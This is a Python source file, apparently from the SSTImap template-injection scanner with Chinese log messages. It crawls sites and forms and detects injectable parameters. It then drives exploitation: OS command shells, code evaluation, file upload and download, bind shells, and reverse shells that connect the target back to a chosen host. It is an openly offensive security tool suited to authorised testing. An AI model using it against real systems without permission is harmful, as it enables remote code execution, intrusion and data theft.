import json
import os
from urllib import parse
import socket
from utils.loggers import log
from core.clis import Shell, MultilineShell
from core.tcpserver import TcpServer
from core.tcpclient import TcpClient
from utils.crawler import crawl, find_forms
from core.channel import Channel
from core.matcher import profile
from utils.strings import formatters


def module_info(line):
    from core.plugin import loaded_plugins
    from core.data_type import loaded_data_types_by_categories
    if line == '':
        plugin_message = ""
        for category in loaded_plugins:
            plugin_message += f"\033[1m\033[4m{category}\033[0m\n"
            for plugin in loaded_plugins[category]:
                mod = ""
                if plugin.__dict__.get("legacy_plugin", False):
                    mod += "\033[91mL\033[0m"
                if plugin.__dict__.get("generic_plugin", False):
                    mod += "\033[93mG\033[0m"
                if plugin.__name__.endswith("_generic"):
                    mod += "\033[96mU\033[0m"
                if plugin.__mro__[1].__name__ == "Plugin":
                    mod += "\033[92mB\033[0m"
                if plugin.__dict__.get("no_tests", False):
                    mod += "\033[95mN\033[0m"
                if plugin.__dict__.get("extra_plugin", False):
                    mod += "\033[94mE\033[0m"
                if mod:
                    mod = f"[{mod}]"
                plugin_message += f" - {mod}\033[1m{plugin.__name__}\033[0m: {plugin.plugin_info['Description']}\n"
        log.log(26, f'插件按类别：\n{plugin_message}')
        data_type_message = ""
        for category in loaded_data_types_by_categories:
            data_type_message += f"\033[1m\033[4m{category}\033[0m\n"
            for data_type in loaded_data_types_by_categories[category]:
                mod = ""
                if data_type.__name__.lower().endswith("auto"):
                    mod += "\033[96mU\033[0m"
                if data_type.__dict__.get("extra_data_type", False):
                    mod += "\033[94mE\033[0m"
                if mod:
                    mod = f"[{mod}]"
                data_type_message += f" - {mod}\033[1m{data_type.__name__}\033[0m: {data_type.data_type_info['Description']}\n"
        log.log(26, f'数据类型：\n{data_type_message}')
    else:
        found = False
        for category in loaded_plugins:
            for plugin in loaded_plugins[category]:
                if plugin.__name__.lower() == line.lower():
                    found = True
                    message = f"Plugin \033[1m{plugin.__name__}\033[0m: {plugin.plugin_info['Description']}\n"
                    mod = []
                    if plugin.__dict__.get("legacy_plugin", False):
                        mod.append("\033[91mL\033[0megacy")
                    if plugin.__dict__.get("generic_plugin", False):
                        mod.append("\033[93mG\033[0meneric")
                    if plugin.__name__.endswith("_generic"):
                        mod.append("\033[96mU\033[0mniversal")
                    if plugin.__mro__[1].__name__ == "Plugin":
                        mod.append("\033[92mB\033[0mase")
                    if plugin.__dict__.get("no_tests", False):
                        mod.append("\033[95mN\033[0mo tests")
                    if plugin.__dict__.get("extra_plugin", False):
                        mod.append("\033[94mE\033[0mxtra")
                    if mod:
                        message += f"{'; '.join(mod)}\n"
                    message += f"Language: {plugin.language}\nCategory: {plugin.group}\n"
                    if plugin.plugin_info.get("Usage notes"):
                        message += f"{plugin.plugin_info['Usage notes']}\n"
                    if plugin.plugin_info.get("Authors"):
                        message += "Authors:\n"
                        for author in plugin.plugin_info['Authors']:
                            message += f" - {author}\n"
                    if plugin.plugin_info.get("References"):
                        message += "References:\n"
                        for ref in plugin.plugin_info['References']:
                            message += f" - {ref}\n"
                    if plugin.plugin_info.get("Engine"):
                        message += '引擎文档：\n'
                        for ref in plugin.plugin_info['Engine']:
                            message += f" - {ref}\n"
                    if plugin.plugin_info.get('Options'):
                        message += '插件选项：\n'
                        for ref in plugin.plugin_info['Options']:
                            message += f" - {ref}\n"
                    log.log(24, message)
        for category in loaded_data_types_by_categories:
            for data_type in loaded_data_types_by_categories[category]:
                if data_type.__name__.lower() == line.lower():
                    found = True
                    message = f"数据类型[1m{data_type.__name__}\033[0m: {data_type.data_type_info['Description']}\n"
                    mod = []
                    if data_type.__name__.lower().endswith("auto"):
                        mod.append("\033[96mU\033[0mniversal")
                    if data_type.__dict__.get("extra_data_type", False):
                        mod.append("\033[94mE\033[0mxtra")
                    if mod:
                        message += f"{'; '.join(mod)}\n"
                    message += f"Category: {data_type.group}\n"
                    if data_type.data_type_info.get("Usage notes"):
                        message += f"{data_type.data_type_info['Usage notes']}\n"
                    if data_type.data_type_info.get("Authors"):
                        message += "Authors:\n"
                        for author in data_type.data_type_info['Authors']:
                            message += f" - {author}\n"
                    if data_type.data_type_info.get("References"):
                        message += "References:\n"
                        for ref in data_type.data_type_info['References']:
                            message += f" - {ref}\n"
                    if data_type.data_type_info.get("Options"):
                        message += '数据类型选项：\n'
                        for ref in data_type.data_type_info['Options']:
                            message += f" - {ref}\n"
                    log.log(24, message)
        if not found:
            log.log(25, '找不到提供名称的模块。')


def get_ruleset(engine_str):
    ruleset = []
    engine_str = engine_str.replace(";", ",").replace(" ", "").replace("\\", "/")
    for rule in engine_str.split(","):
        rule = rule.split(":")
        engine = rule[-1].split("/")
        # 将 - 替换为 _ ，就像类名中的做法一样
        ruleset.append({
            "engine": engine[-1].lower().replace('-', '_') if engine[-1] else "*",
            "group": engine[0].lower().replace('-', '_') if len(engine) > 1 and engine[0] else "*",
            "language": rule[0].lower().replace('-', '_') if len(rule) > 1 and rule[0] else "*",
            "language_variant": rule[1].lower().replace('-', '_') if len(rule) > 2 and rule[1] else "*",
        })
    return ruleset


def check_ruleset(ruleset, engine, legacy, generic):
    for rule in ruleset:
        if rule["engine"] not in ["*", engine.plugin.lower().replace('-', '_')]:
            continue
        if rule["group"] not in ["*", engine.group.lower().replace('-', '_')]:
            continue
        if rule["language"] not in ["*", engine.language.split(":")[0].lower().replace('-', '_')]:
            continue
        # 规则永远不会为空，因此没有变体的语言将仅与 * 匹配
        language_variant = engine.language.split(":")[1] if len(engine.language.split(":")) > 1 else ""
        if rule["language_variant"] not in ["*", language_variant.lower().replace('-', '_')]:
            continue
        # 检查旧版和通用引擎，如果设置了标志或给出了显式名称，则允许
        if engine.legacy_plugin and not (legacy or rule["engine"] != '*'):
            continue
        if engine.generic_plugin and not (generic or rule["engine"] != '*'):
            continue
        return True
    return False


def plugins(args):
    from core.plugin import loaded_plugins
    plugin_list = []
    for group in loaded_plugins:
        plugin_list += loaded_plugins.get(group, [])
    engine = args.get('engine')
    if not engine:
        engine = '*'
    ruleset = get_ruleset(engine)
    all_plugin_list = plugin_list
    plugin_list = []
    for p in all_plugin_list:
        if check_ruleset(ruleset, p, args.get('legacy'), args.get('generic')):
            plugin_list.append(p)
    plugin_list.sort(key=lambda x: x.priority)
    return plugin_list


def print_injection_summary(channel):
    if channel.data.get('blind'):
        technique = "time-based blind"
    elif channel.data.get('boolean'):
        technique = "boolean error-based blind"
    elif channel.data.get('error'):
        technique = "error-based"
    else:
        technique = "rendered"
    formatter = formatters[channel.data.get("formatter", "default")]
    prefix = channel.data.get('prefix', '').replace('\n', '\\n')
    render = formatter(channel.data.get('render', channel.default_wrapper), {"code": "*"}).replace('\n', '\\n')
    suffix = channel.data.get('suffix', '').replace('\n', '\\n')
    wrapper = formatter(channel.data.get('wrapper', channel.default_wrapper), {"code": render}).replace('\n', '\\n')
    if channel.data.get('evaluate_blind'):
        evaluation = f"\033[92m支持\033[0m，{channel.data.get('language')} 代码（盲注）"
    elif channel.data.get('evaluate'):
        evaluation = f"\033[92m支持\033[0m，{channel.data.get('language')} 代码"
    else:
        evaluation = '\033[91m不支持\033[0m'
    if channel.data.get('execute_blind'):
        execution = '\033[92m支持\033[0m（盲注）'
    elif channel.data.get('execute'):
        execution = '\033[92m支持\033[0m'
    else:
        execution = '\033[91m不支持\033[0m'
    if channel.data.get('write'):
        if channel.data.get('blind') or channel.data.get('boolean'):
            writing = '\033[92m支持\033[0m（盲注）'
        else:
            writing = '\033[92m支持\033[0m'
    else:
        writing = '\033[91m不支持\033[0m'
    field_names = {
        'Query': '查询字符串',
        'Body': '请求正文',
        'Header': '请求头',
        'Cookie': 'Cookie',
    }
    technique_names = {
        'rendered': '渲染回显',
        'error-based': '报错型',
        'boolean-based': '布尔型盲注',
        'time-based': '时间型盲注',
        'boolean error-based blind': '布尔报错型盲注',
        'time-based blind': '时间型盲注',
    }
    technique = technique_names.get(technique, technique)
    field = channel.injs[channel.inj_idx]['field']
    no = f'{chr(27)}[91m不支持{chr(27)}[0m'
    yes = f'{chr(27)}[92m支持{chr(27)}[0m'
    log.log(21, f"""SSTImap 识别到以下注入点：

  {field_names.get(field, field)}参数：{channel.injs[channel.inj_idx]['param']}
  模板引擎：{channel.data.get('engine')}
  注入表达式：{prefix}{wrapper}{suffix}
  上下文：{'文本' if (not prefix and not suffix) else '代码'}
  操作系统：{channel.data.get('os', '未识别')}
  检测技术：{technique}
  可用能力：

    Shell 命令执行：{execution}
    绑定与反向 Shell：{no if not channel.data.get('bind_shell') else yes}
    文件写入：{writing}
    文件读取：{no if not channel.data.get('read') else yes}
    代码求值：{evaluation}
""")


def detect_template_injection(channel):
    for i in range(len(channel.injs)):
        field_names = {'Query': '查询字符串', 'Body': '请求正文', 'Header': '请求头', 'Cookie': 'Cookie'}
        field = channel.injs[channel.inj_idx]['field']
        log.log(28, f"正在测试{field_names.get(field, field)}参数 '{channel.injs[channel.inj_idx]['param']}' 是否可注入")
        if 'B' in channel.args.get('technique') and not (channel.args.get('boolean_regex_ok') or
                                                         channel.args.get('boolean_regex_err')):
            log.log(28, f"为布尔报错型盲注检测创建页面配置文件")
            page_profile, page_vector, success = profile(channel)
            if not success and page_profile:
                log.log(22, '网站似乎是高度动态的，布尔报错型盲注检测将被跳过。尝试降低 --bool-min 参数或使用 --bool-ok 或 --bool-err 进行基于 RegEx 的测试。')
                channel.boolean_enabled = False
            elif not success:
                log.log(22, '与网站的连接似乎不稳定，将跳过布尔报错型盲注检测。尝试使用 --bool-ok 或 --bool-err 进行基于 RegEx 的测试。')
                channel.boolean_enabled = False
            else:
                channel.boolean_enabled = True
            channel.page_profile = page_profile
            channel.page_vector = page_vector
        else:
            channel.boolean_enabled = True
        for plugin in plugins(channel.args):
            current_plugin = plugin(channel)
            current_plugin.detect()
            if channel.data.get('engine'):
                return current_plugin
        channel.inj_idx += 1


def check_template_injection(channel):
    current_plugin = detect_template_injection(channel)
    if not channel.data.get('engine'):
        log.log(22, '测试的参数似乎不可注入。')
        return current_plugin
    print_injection_summary(channel)
    if not any(f for f, v in channel.args.items() if f in ('os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell',
                                                           'tpl_code', 'bind_shell', 'reverse_shell', 'eval_shell',
                                                           'eval_code', 'interactive') and v):
        log.log(21, f"""可使用以下任一选项重新运行 SSTImap：
    \033[92m--interactive\033[0m                进入交互模式，可在不丢失检测进度的情况下切换操作模式。{'''
    --os-shell                   打开交互式操作系统 Shell。
    --os-cmd                     执行操作系统命令。''' if channel.data.get('execute') or channel.data.get('execute_blind') else ''}{'''
    --eval-shell                 打开模板引擎底层语言的交互式 Shell。
    --eval-cmd                   执行模板引擎底层语言代码。''' if channel.data.get('evaluate') or channel.data.get('evaluate_blind') else ''}{'''
    --tpl-shell                  打开模板引擎的交互式 Shell。
    --tpl-cmd                    注入模板代码。''' if channel.data.get('engine') else ''}{'''
    --bind-shell PORT            连接到目标端口上绑定的 Shell。''' if channel.data.get('bind_shell') else ''}{'''
    --reverse-shell HOST PORT    让目标反向连接指定主机和端口。''' if channel.data.get('reverse_shell') else ''}{'''
    --upload LOCAL REMOTE        将本地文件上传到目标。''' if channel.data.get('write') else ''}{'''
    --download REMOTE LOCAL      将目标文件下载到本地。''' if channel.data.get('read') else ''}""")
        return current_plugin
    # 执行操作系统命令
    if channel.args.get('os_cmd') or channel.args.get('os_shell'):
        if channel.data.get('execute_blind'):
            log.log(23, '已经发现盲注入，命令执行不会产生任何输出。')
            if channel.data.get('boolean'):
                log.log(26, '无论命令成功与否，都会返回 True 或 False。')
            else:
                log.log(26, '通过将“&& sleep <delay>”附加到 shell 命令来引入延迟。无论返回成功与否，都返回True或False。')
            if channel.args.get('os_cmd'):
                print(current_plugin.execute_blind(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, '在操作系统上运行命令。')
                Shell(current_plugin.execute_blind, f"{channel.data.get('os', 'undetected')} (blind) $ ").cmdloop()
        elif channel.data.get('execute'):
            if channel.args.get('os_cmd'):
                print(current_plugin.execute(channel.args.get('os_cmd')))
            elif channel.args.get('os_shell'):
                log.log(21, '在操作系统上运行命令。')
                Shell(current_plugin.execute, f"{channel.data.get('os', 'undetected')} $ ").cmdloop()
        else:
            log.log(22, '在目标上未检测到系统命令执行能力。')
    # 执行模板命令
    if channel.args.get('tpl_code') or channel.args.get('tpl_shell'):
        if channel.data.get('engine'):
            if channel.data.get('blind') or channel.data.get('boolean'):
                log.log(23, '只发现了盲目执行。注入的模板代码不会产生任何输出。')
                call = current_plugin.inject
            else:
                call = current_plugin.render
            if channel.args.get('tpl_code'):
                print(call(channel.args.get('tpl_code')))
            elif channel.args.get('tpl_shell'):
                log.log(21, '注入多行模板代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
                MultilineShell(call, f"{channel.data.get('engine', '')} > ").cmdloop()
        else:
            log.log(22, '目标上未检测到模板代码评估功能')
    # 执行语言命令
    if channel.args.get('eval_code') or channel.args.get('eval_shell'):
        if channel.data.get('evaluate_blind'):
            log.log(23, '只发现了盲目执行。无论代码计算结果是否为真值，都会返回 True 或 False。')
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate_blind(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, '评估多行模板基础语言代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
                MultilineShell(current_plugin.evaluate_blind, f"{channel.data.get('language', '')} > ").cmdloop()
        elif channel.data.get('evaluate'):
            if channel.args.get('eval_code'):
                print(current_plugin.evaluate(channel.args.get('eval_code')))
            elif channel.args.get('eval_shell'):
                log.log(21, '评估多行模板基础语言代码。按 ctrl-D 或在新行上键入“EOF”以发送行')
                MultilineShell(current_plugin.evaluate, f"{channel.data.get('language', '')} > ").cmdloop()
        else:
            log.log(22, '目标上未检测到语言代码评估功能')
    # 执行文件上传
    local_remote_paths = channel.args.get('upload')
    if local_remote_paths:
        if channel.data.get('write'):
            local_path, remote_path = local_remote_paths
            try:
                with open(local_path, 'rb') as f:
                    data = f.read()
                current_plugin.write(data, remote_path)
            except FileNotFoundError:
                log.log(25, f'未找到本地文件： {local_path}')
        else:
            log.log(22, '目标上未检测到文件上传功能')
    # 执行文件读取
    remote_local_paths = channel.args.get('download')
    if remote_local_paths:
        if channel.data.get('read'):
            remote_path, local_path = remote_local_paths
            content = current_plugin.read(remote_path)
            with open(local_path, 'wb') as f:
                f.write(content)
        else:
            log.log(22, '目标上未检测到文件下载功能')
    # 连接到 TCP shell
    bind_shell_port = channel.args.get('bind_shell')
    if bind_shell_port:
        if channel.data.get('bind_shell'):
            urlparsed = parse.urlparse(channel.base_url)
            if not urlparsed.hostname:
                log.log(22, '解析主机名时出错')
                return current_plugin
            for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port, shell=channel.args.get('remote_shell'))):
                log.log(26, f'在远程端口上生成 shell {bind_shell_port} 带载荷 {idx+1}')
                thread.join(timeout=1)
                if not thread.is_alive():
                    continue
                try:
                    a = TcpClient(urlparsed.hostname.decode(), bind_shell_port, timeout=5)
                    a.shell()
                    return current_plugin
                except (KeyboardInterrupt, EOFError):
                    print()
                    log.log(26, '退出绑定 shell')
                except Exception as e:
                    log.debug(f"连接到时出错 {urlparsed.hostname}:{bind_shell_port} {e}")
        else:
            log.log(22, '目标上未检测到 TCP shell 打开功能')
    # 接受反向 TCP 连接
    reverse_shell_host_port = channel.args.get('reverse_shell')
    if reverse_shell_host_port:
        host, port = reverse_shell_host_port
        timeout = 15
        if channel.data.get('reverse_shell'):
            current_plugin.reverse_shell(host, port, shell=channel.args.get('remote_shell'))
            # 运行 TCP 服务器
            try:
                TcpServer(int(port), timeout)
            except socket.timeout:
                log.log(22, f"之后没有传入的 TCP shell {timeout}s, quitting.")
        else:
            log.log(22, '目标上未检测到反向 TCP shell 功能')
    return current_plugin


def scan_website(args):
    urls = set()
    forms = set()
    single_url = args.get('url', None)
    if single_url:
        urls.add(single_url)
    preloaded_urls = args.get('loaded_urls', None)
    if preloaded_urls:
        urls.update(preloaded_urls)
    preloaded_forms = args.get('loaded_forms', None)
    if preloaded_forms:
        forms.update(preloaded_forms)
    if args['load_forms']:
        if args['load_forms'] == "-":
            args['load_forms'] = 0
        elif os.path.isdir(args['load_forms']):
            args['load_forms'] = f"{args['load_forms']}/forms.json"
        if args['load_forms'] == 0 or os.path.exists(args['load_forms']):
            try:
                with open(args['load_forms'], 'r') as stream:
                    loaded_forms = set([tuple(x) for x in json.load(stream)])
                forms.update(loaded_forms)
                log.log(21, f"已加载 {len(loaded_forms)} 表格来自 "
                            f"{'STDIN' if args['load_forms'] == 0 else ('file: ' + args['load_forms'])}")
            except Exception as e:
                log.log(22, f"从文件加载表单时出错：\n{repr(e)}")
    if not forms or args['forms']:
        if args['load_urls']:
            if args['load_urls'] == "-":
                args['load_urls'] = 0
            elif os.path.isdir(args['load_urls']):
                args['load_urls'] = f"{args['load_urls']}/urls.txt"
            if args['load_urls'] == 0 or os.path.exists(args['load_urls']):
                try:
                    with open(args['load_urls'], 'r') as stream:
                        loaded_urls = set([x.strip() for x in stream.readlines()])
                    urls.update(loaded_urls)
                    log.log(21, f"已加载 {len(loaded_urls)} 网址来自 "
                                f"{'STDIN' if args['load_urls'] == 0 else ('file: ' + args['load_urls'])}")
                except Exception as e:
                    log.log(22, f"从文件加载 URL 时发生错误：\n{repr(e)}")
        if args['crawl_depth']:
            crawled_urls = crawl(urls, args)
            urls.update(crawled_urls)
            args['crawled_urls'] = crawled_urls
            if args['save_urls']:
                if os.path.isdir(args['save_urls']):
                    args['save_urls'] = f"{args['save_urls']}/sstimap_urls.txt"
                try:
                    with open(args['save_urls'], 'w') as stream:
                        stream.write("\n".join(crawled_urls))
                    log.log(21, f"保存到文件的 URL： {args['save_urls']}")
                except Exception as e:
                    log.log(22, f"将 URL 保存到文件时发生错误：\n{repr(e)}")
    else:
        log.log(25, '由于表单已提供，因此跳过 URL 加载和爬取')
    args['target_urls'] = urls
    if args['forms']:
        crawled_forms = find_forms(urls, args)
        forms.update(crawled_forms)
        args['crawled_forms'] = crawled_forms
        if args['save_forms'] and crawled_forms:
            if os.path.isdir(args['save_forms']):
                args['save_forms'] = f"{args['save_forms']}/sstimap_forms.json"
            try:
                with open(args['save_forms'], 'w') as stream:
                    json.dump([x for x in crawled_forms], stream, indent=4)
                log.log(21, f"保存到文件的表格： {args['save_forms']}")
            except Exception as e:
                log.log(22, f"将表单保存到文件时出错：\n{repr(e)}")
    args['target_forms'] = forms
    if not urls and not forms:
        log.log(22, '未找到目标')
        return None, None
    elif not forms:
        for url in urls:
            log.log(27, f'扫描网址： {url}')
            url_args = args.copy()
            url_args['url'] = url
            channel = Channel(url_args)
            result = check_template_injection(channel)
            if channel.data.get('engine'):
                return result, channel  # TODO：保存漏洞
    else:
        for form in forms:
            log.log(27, f'扫描带有网址的表格： {form[0]}')
            url_args = args.copy()
            url_args['url'] = form[0]
            url_args['method'] = form[1]
            # url_args['data'] 包含主体作为用户提供的部分的字典
            url_args['data'] = []
            if form[1].upper() != "GET" and form[2] != "":
                url_args['data'] = [form[2]]
            channel = Channel(url_args)
            result = check_template_injection(channel)
            if channel.data.get('engine'):
                return result, channel  # TODO：保存漏洞
    return None, None
